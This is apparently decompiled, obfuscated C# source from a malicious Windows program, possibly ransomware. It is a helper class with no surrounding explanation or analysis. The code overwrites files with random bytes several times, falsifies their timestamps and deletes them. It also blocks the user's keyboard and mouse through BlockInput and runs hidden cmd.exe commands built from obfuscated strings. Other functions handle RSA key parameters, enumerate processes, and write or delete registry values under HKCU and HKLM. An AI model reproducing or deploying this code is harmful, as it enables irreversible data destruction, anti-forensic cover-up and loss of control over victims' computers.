using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Xml.Serialization;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;
using Microsoft.Win32;

namespace C3904355907;

public class C4067256894
{
	public const string C3554254475 = "C:\\Windows\\System32\\cmd.exe";

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool bool_0);

	public static string C3554254475(RSAParameters rsaparameters_0)
	{
		StringWriter stringWriter = new StringWriter();
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		xmlSerializer.Serialize(stringWriter, rsaparameters_0);
		return stringWriter.ToString();
	}

	public static void C3554254475(string string_0, int int_0 = 5)
	{
		try
		{
			if (string.IsNullOrEmpty(string_0) || string.IsNullOrWhiteSpace(string_0) || !File.Exists(string_0))
			{
				return;
			}
			File.SetAttributes(string_0, FileAttributes.Normal);
			double num = Math.Ceiling((double)new FileInfo(string_0).Length / 512.0);
			byte[] array = new byte[512];
			FileStream fileStream = new FileStream(string_0, FileMode.Open);
			if (fileStream == null)
			{
				return;
			}
			for (int i = 0; i < int_0; i++)
			{
				fileStream.Position = 0L;
				for (int j = 0; (double)j < num; j++)
				{
					Random random = new Random();
					random.NextBytes(array);
					fileStream.Write(array, 0, array.Length);
				}
			}
			fileStream.SetLength(0L);
			fileStream.Close();
			Random random2 = new Random();
			DateTime dateTime = new DateTime(random2.Next(2000, 2024), random2.Next(1, 12), random2.Next(1, 28), random2.Next(1, 12), random2.Next(1, 60), random2.Next(1, 60));
			File.SetCreationTime(string_0, dateTime);
			File.SetLastAccessTime(string_0, dateTime);
			File.SetLastWriteTime(string_0, dateTime);
			File.SetCreationTimeUtc(string_0, dateTime);
			File.SetLastAccessTimeUtc(string_0, dateTime);
			File.SetLastWriteTimeUtc(string_0, dateTime);
			File.Delete(string_0);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static RSAParameters C3554254475(string string_0)
	{
		StringReader textReader = new StringReader(string_0);
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		return (RSAParameters)xmlSerializer.Deserialize(textReader);
	}

	public static string[] C3554254475()
	{
		List<string> list = new List<string>();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			list.Add(process.ProcessName);
		}
		return list.ToArray();
	}

	public static string C3904355907(string string_0)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo2 = (process.StartInfo = new ProcessStartInfo
			{
				UseShellExecute = false,
				RedirectStandardOutput = true,
				FileName = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iD(),
				Arguments = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JP() + string_0
			});
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return null;
		}
	}

	public static string C3554254475(string string_0, string string_1 = null)
	{
		string text;
		do
		{
			text = Guid.NewGuid().ToString();
		}
		while (File.Exists(Path.Combine(string_0, text)));
		if (string.IsNullOrEmpty(string_1) || string.IsNullOrWhiteSpace(string_1))
		{
			return Path.Combine(string_0, text);
		}
		return Path.Combine(string_0, text + string_1);
	}

	public static void C3904355907(bool bool_0)
	{
		BlockInput(bool_0);
	}

	public static void C3554254475(string string_0, List<string> list_0, List<string> list_1, string[] string_1)
	{
		if (!string.IsNullOrEmpty(string_0) && list_0 != null && list_1 != null && string_1 != null && string_1 != null)
		{
			StreamWriter streamWriter = new StreamWriter(string_0);
			int num = Math.Min(list_0.Count, Math.Min(list_1.Count, string_1.Length));
			for (int i = 0; i < num; i++)
			{
				streamWriter.WriteLine(list_0[i] + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.aj() + list_1[i] + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jp() + string_1[i]);
			}
		}
	}

	public static bool C3554254475(int int_0, string string_0, string string_1)
	{
		RegistryKey registryKey = C3554254475(int_0, string_0);
		if (registryKey == null)
		{
			return false;
		}
		object value = registryKey.GetValue(string_1);
		if (value == null)
		{
			return false;
		}
		return true;
	}

	public static bool C3554254475(int int_0, string string_0, string string_1, object object_0)
	{
		RegistryKey registryKey = C3554254475(int_0, string_0);
		if (registryKey == null)
		{
			return false;
		}
		object value = registryKey.GetValue(string_1);
		if (value == null)
		{
			return false;
		}
		return value == object_0;
	}

	public static void C3904355907(int int_0, string string_0, string string_1)
	{
		C3904355907(int_0, string_0, string_1, null);
	}

	public static void C3904355907(int int_0, string string_0, string string_1, object object_0)
	{
		try
		{
			C1255198513(int_0, string_0, string_1, object_0);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void C1255198513(int int_0, string string_0, string string_1, object object_0)
	{
		try
		{
			RegistryKey registryKey = C3554254475(int_0, string_0);
			if (registryKey != null)
			{
				if (object_0 == null)
				{
					registryKey.SetValue(string_1, DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz());
				}
				else
				{
					registryKey.SetValue(string_1, object_0);
				}
				registryKey.Close();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void C1255198513(int int_0, string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = C3554254475(int_0, string_0);
			if (registryKey != null)
			{
				registryKey.DeleteValue(string_1);
				registryKey.Close();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static RegistryKey C3554254475(int int_0, string string_0)
	{
		return int_0 switch
		{
			0 => Registry.CurrentUser.OpenSubKey(string_0, writable: true), 
			1 => Registry.LocalMachine.OpenSubKey(string_0, writable: true), 
			_ => null, 
		};
	}
}
